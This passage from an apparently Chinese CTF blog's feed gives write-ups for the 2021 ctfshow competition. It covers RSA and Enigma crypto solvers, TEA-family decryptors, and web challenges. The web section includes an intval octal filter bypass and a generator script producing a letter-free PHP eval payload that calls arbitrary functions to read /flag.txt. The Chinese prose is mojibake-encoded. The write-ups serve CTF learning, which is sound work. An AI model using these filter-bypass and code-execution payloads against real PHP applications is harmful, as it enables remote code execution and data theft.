id="é—ªç”µäº”è¿é­Â·å››é­"><a href="#é—ªç”µäº”è¿é­Â·å››é­" class="headerlink" title="é—ªç”µäº”è¿é­Â·å››é­"></a>é—ªç”µäº”è¿é­Â·å››é­</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># BB = B^17</span></span><br><span class="line"><span class="comment"># BB_inv = BB^(-1)</span></span><br><span class="line"><span class="comment"># CC = C * BB_inv</span></span><br><span class="line"><span class="comment"># I.trace() = 88</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">8832564044541326030658929702316436880591014904231676570839678873603730471484972295046612326549001678639811100026511993</span></span><br><span class="line">cc = <span class="number">5298954238197992022282643920507107154250709069597164746868432885002292554976622438394424965260846005857405245601483810</span></span><br><span class="line">cc = (cc * gmpy2.invert(<span class="number">88</span>, n)) % n</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(<span class="number">17</span>, euler_phi(n))</span><br><span class="line">m = <span class="built_in">pow</span>(cc, d, n)</span><br><span class="line"><span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="å¤§é¸Ÿè½¬è½¬è½¬"><a href="#å¤§é¸Ÿè½¬è½¬è½¬" class="headerlink" title="å¤§é¸Ÿè½¬è½¬è½¬"></a>å¤§é¸Ÿè½¬è½¬è½¬</h3><blockquote><p>ä¸ºå“åº”ç¾¤ä¸»â€œæ€ä¹ˆç®€å•æ€ä¹ˆæ¥â€çš„å·å¬ï¼Œç‰¹è¡¥ä¸Šä¸€é“å¤å…¸å¯†ç ã€‚</p><p>æ˜æ–‡å¯†æ–‡éƒ½æ˜¯å¤§å†™å­—æ¯ã€‚</p><p>è¯·è§£å‡ºæ­£ç¡®çš„æ˜æ–‡åï¼ŒæŠŠæ˜æ–‡è½¬æ¢æˆ<strong>å°å†™</strong>ï¼Œå¹¶åŠ ä¸Šæ ¼å¼æ‰€åŒ…å«çš„èŠ±æ‹¬å·ã€‚</p></blockquote><p>Engimaå¯†ç æœºã€‚</p><p>pythonååºåˆ—åŒ–ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">x = pickle.load(<span class="built_in">open</span>(<span class="string">&#x27;nimage.pickle&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;&#x27;UMKEHRWALZE&#x27;: &#x27;B&#x27;, &#x27;WALZENLAGE&#x27;: &#x27;123&#x27;, &#x27;GRUNDSTELLUNG&#x27;: &#x27;WYF&#x27;, &#x27;RINGSTELLUNG&#x27;: &#x27;???&#x27;, &#x27;STECKERVERBINDUNGEN&#x27;: [&#x27;WO&#x27;, &#x27;DE&#x27;, &#x27;JB&#x27;, &#x27;HN&#x27;, &#x27;XI&#x27;], &#x27;KLARTEXT&#x27;: &#x27;CTFSHOW?????????????????????????????&#x27;, &#x27;GEHEIMTEXT&#x27;: &#x27;MXKXBTIOOZHFTGGTTPTRNXJUGASUTVBNSNGS&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p>å°è¯•ç”¨å…¨è„šæœ¬è§£å¯†å¾—åˆ°çš„ç»“æœæœ‰é—®é¢˜ï¼Œå†ç”¨pycipherå·¥å…·è§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pycipher <span class="keyword">import</span> Enigma</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">dic = string.ascii_uppercase</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> dic:</span><br><span class="line">            eng = Enigma(settings=(<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;F&#x27;</span>),rotors=(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),reflector=<span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">                 ringstellung=(x,y,z),steckers=[(<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;O&#x27;</span>),(<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>),</span><br><span class="line">                 (<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;B&#x27;</span>),(<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;N&#x27;</span>),(<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;I&#x27;</span>)])</span><br><span class="line">            flag = eng.decipher(<span class="string">&#x27;MXKXBTIOOZHFTGGTTPTRNXJUGASUTVBNSNGS&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> flag.startswith(<span class="string">&#x27;CTFSHOW&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>((x,y,z),flag.lower())</span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="Tea-tube-pot"><a href="#Tea-tube-pot" class="headerlink" title="Tea_tube_pot"></a>Tea_tube_pot</h3><blockquote><p>ä¸‰ç‚¹å‡ åšŸï¼Œé¥®èŒ¶å…ˆå•¦ï¼ï¼ˆç»™å¤§ä½¬é€’èŒ¶.jpgï¼‰</p></blockquote><p>flagåˆ†ä¸‰éƒ¨åˆ†ã€‚</p><p>ç¬¬ä¸€éƒ¨åˆ† TEAåŠ å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">v, k</span>):</span></span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0x9E3779B9</span> * <span class="number">32</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    encrypted = [<span class="number">0x5FD744F6</span>,<span class="number">0x95832046</span>]</span><br><span class="line">    key = [<span class="number">0x73696854</span>, <span class="number">0x5F73695F</span>, <span class="number">0x74616574</span>, <span class="number">0x21656275</span>]</span><br><span class="line">    decrypted = decrypt(encrypted, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(decrypted[<span class="number">1</span>])[<span class="number">2</span>:]+<span class="built_in">hex</span>(decrypted[<span class="number">0</span>])[<span class="number">2</span>:])[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># ENCrT1ny</span></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒéƒ¨åˆ† XTEAåŠ å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">rounds, v, k</span>):</span></span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    x = delta * rounds</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (x + k[(x &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (x + k[x &amp; <span class="number">3</span>])</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    encrypted = [<span class="number">0xFD731313</span>, <span class="number">0x6662CB90</span>]</span><br><span class="line">    key = [<span class="number">0x73696854</span>, <span class="number">0x5F73695F</span>, <span class="number">0x74616574</span>, <span class="number">0x21656275</span>]</span><br><span class="line">    rounds = <span class="number">32</span></span><br><span class="line">    decrypted = decrypt(rounds, encrypted, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(decrypted[<span class="number">1</span>])[<span class="number">2</span>:]+<span class="built_in">hex</span>(decrypted[<span class="number">0</span>])[<span class="number">2</span>:])[::-<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line"><span class="comment"># yPti0nA1</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰éƒ¨åˆ† XXTEAåŠ å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shift</span>(<span class="params">z, y, x, k, p, e</span>):</span></span><br><span class="line">    <span class="keyword">return</span> ((((z &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((x ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">v, k</span>):</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    n = <span class="built_in">len</span>(v)</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    x = (rounds * delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        e = (x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            z = v[p - <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            y = v[p]</span><br><span class="line">        p -= <span class="number">1</span></span><br><span class="line">        z = v[n - <span class="number">1</span>]</span><br><span class="line">        v[<span class="number">0</span>] = (v[<span class="number">0</span>] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        x = (x - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    encrypted = [<span class="number">0x4B136C82</span>, <span class="number">0x1A6E9613</span>]</span><br><span class="line">    key = [<span class="number">0x73696854</span>, <span class="number">0x5F73695F</span>, <span class="number">0x74616574</span>, <span class="number">0x21656275</span>]</span><br><span class="line">    decrypted = decrypt(encrypted, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(decrypted[<span class="number">1</span>])[<span class="number">2</span>:]+<span class="built_in">hex</span>(decrypted[<span class="number">0</span>])[<span class="number">2</span>:])[::-<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 9ori7hM!</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="wuqian"><a href="#wuqian" class="headerlink" title="wuqian"></a>wuqian</h3><p>ROP x64ç­¾åˆ°ã€‚ç„¶åç­¾é€€ã€‚</p><p>â€‹    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="çƒ­èº«"><a href="#çƒ­èº«" class="headerlink" title="çƒ­èº«"></a>çƒ­èº«</h3><blockquote><p>æœ€ç®€å•çš„ç­¾åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>å…«è¿›åˆ¶ç»•è¿‡ï¼Œå‰é¢åŠ ä¸ªå­—ç¬¦ï¼š<code>?num=%0a010574</code>ã€‚</p><p>â€‹    </p><h3 id="shellme"><a href="#shellme" class="headerlink" title="shellme"></a>shellme</h3><blockquote><p>è¿˜æ˜¯ç†Ÿæ‚‰çš„æ„Ÿè§‰</p></blockquote><p>phpinfoé¡µé¢ç›´æ¥æœflagï¼Œå¾ˆç†Ÿæ‚‰ã€‚</p><p>â€‹    </p><h3 id="shellme-Revenge"><a href="#shellme-Revenge" class="headerlink" title="shellme_Revenge"></a>shellme_Revenge</h3><blockquote><p>ç”±äºä¸Šä¸ªé¢˜æœ‰ä¸¥é‡çš„éé¢„æœŸï¼Œæˆ‘çš„é”…ï¼Œåœ¨æ­¤ç»™å¸ˆå‚…ä»¬é“æ­‰äº†</p></blockquote><p>cookie çœ‹åˆ° hint=looklookï¼Œè®¿é—® <code>?looklook=1</code> å¾—åˆ°æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;looklook&#x27;</span>])&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    setcookie(<span class="string">&quot;hint&quot;</span>, <span class="string">&quot;?looklook&quot;</span>, time()+<span class="number">3600</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_string(<span class="variable">$ctfshow</span>) || strlen(<span class="variable">$ctfshow</span>) &lt;= <span class="number">107</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;fucccc hacker!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç¦ç”¨äº†å¾ˆå¤š RCE ç»•è¿‡å§¿åŠ¿ï¼Œæœªç¦ç”¨ <code>$+_;?()[]&lt;&gt;</code>ã€å­—æ¯<code>C</code> å’Œæ•°å­—<code>0-3</code>ï¼Œå°è¯•ç”¨æˆªæ–­è¾“å‡ºå†…å®¹ï¼Œç”¨PHPè‡ªå¢ç‰¹æ€§ç”Ÿæˆå…¶ä»–å­—æ¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_=[];?&gt;&lt;?=$_ //çœŸArray</span><br><span class="line">$_=([].C);?&gt;&lt;?=$_ //å­—ç¬¦ä¸²ArrayC</span><br><span class="line">$_=([].C)[3];?&gt;&lt;?=$_ //å­—æ¯a</span><br><span class="line">$_=([].C)[3];$_++;?&gt;&lt;?=$_ //å­—æ¯b</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>æ ¹æ®PHPæ‹¼æ¥ç‰¹æ€§ï¼Œå°†éœ€è¦çš„å…³é”®å­—æ‹†åˆ†æˆå­—æ¯ï¼Œç”¨è‡ªå¢ç‰¹æ€§ç”Ÿæˆï¼ŒæŒ‰ç…§å­—æ¯åºç”Ÿæˆå¯èŠ‚çœpayloadé•¿åº¦ã€‚</p><p>payloadç”Ÿæˆè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload: xxxxxx?&gt;&lt;?=($_GET[0])($_GET[1]);</span></span><br><span class="line"></span><br><span class="line">alpha = <span class="built_in">list</span>(<span class="built_in">set</span>(need))</span><br><span class="line">alpha.sort()</span><br><span class="line"><span class="built_in">print</span>(alpha)</span><br><span class="line">greece = <span class="string">&#x27;Î± Î² Î³ Î´ Îµ Î¶ Î½ Î¾ Î¿ Ï€ Ï Ïƒ Î· Î¸ Î¹ Îº Î» Î¼ Ï„ Ï… Ï† Ï‡ Ïˆ Ï‰ Î“ Î”&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">out = <span class="string">&#x27;$_=C;&#x27;</span></span><br><span class="line">cnt = <span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> alpha:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">now_php = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(k)-cnt):</span><br><span class="line">now_php += <span class="string">&#x27;$_++;&#x27;</span></span><br><span class="line">cnt += <span class="number">1</span></span><br><span class="line">icon = greece[<span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)]</span><br><span class="line">now_php += <span class="string">f&#x27;$<span class="subst">&#123;icon&#125;</span>=$_;&#x27;</span></span><br><span class="line">out += now_php</span><br><span class="line"></span><br><span class="line">func = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> need:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">icon = greece[<span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)]</span><br><span class="line">func += [<span class="string">f&#x27;$<span class="subst">&#123;icon&#125;</span>&#x27;</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">func += [k]</span><br><span class="line">func = <span class="string">&#x27;.&#x27;</span>.join(func)</span><br><span class="line"><span class="built_in">print</span>(func)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&#x27;<span class="subst">&#123;out&#125;</span>?&gt;&lt;?=($&#123;&#123;_.<span class="subst">&#123;func&#125;</span>&#125;&#125;[0])($&#123;&#123;_.<span class="subst">&#123;func&#125;</span>&#125;&#125;[1]);&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>POSTï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctf_show = </span><br><span class="line">$_=([].C)[3];$Î±=$_;$_++;$_++;$_++;$_++;$Îµ=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$Ïƒ=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$Ï‡=$_;$Î²=$Îµ.$Ï‡.$Î±.$Ïƒ;$_=C;$_++;$_++;$Î³=$_;$_++;$_++;$Îµ=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$Î¼=$_;($&#123;_.$Îµ.$Î³.$Î¼&#125;[0])($&#123;_.$Îµ.$Î³.$Î¼&#125;[1]);</span><br></pre></td></tr></table></figure><p>GET:</p><p><code>?looklook=1&amp;0=file_get_contents&amp;1=/flag.txt</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;æ¯”èµ›åç§°ï¼šctfshow åƒç“œæ¯&lt;br&gt;é¢˜ç›®èŒƒå›´ï¼šweb pwn re misc crypto&lt;br&gt;é¢˜ç›®éš¾åº¦ï¼šæ€ä¹ˆç®€å•æ€ä¹ˆæ¥&lt;br&gt;æ¯”èµ›å¥–åŠ±ï¼šctfshowå®šåˆ¶é¼ æ ‡å«æˆ–èŒå¦¹æ‰‹åŠ&lt;br&gt;æ¯”èµ›æ—¶é—´ï¼š2021å¹´8æœˆ14æ—¥(å‘¨å…­) æ™š 7ç‚¹7åˆ†&lt;br&gt;æ¯”</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021èµ›" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²</title>
    <link href="https://lazzzaro.github.io/2021/08/08/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <id>https://lazzzaro.github.io/2021/08/08/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</id>
    <published>2021-08-08T10:23:45.000Z</published>
    <updated>2022-08-09T16:20:17.091Z</updated>
    
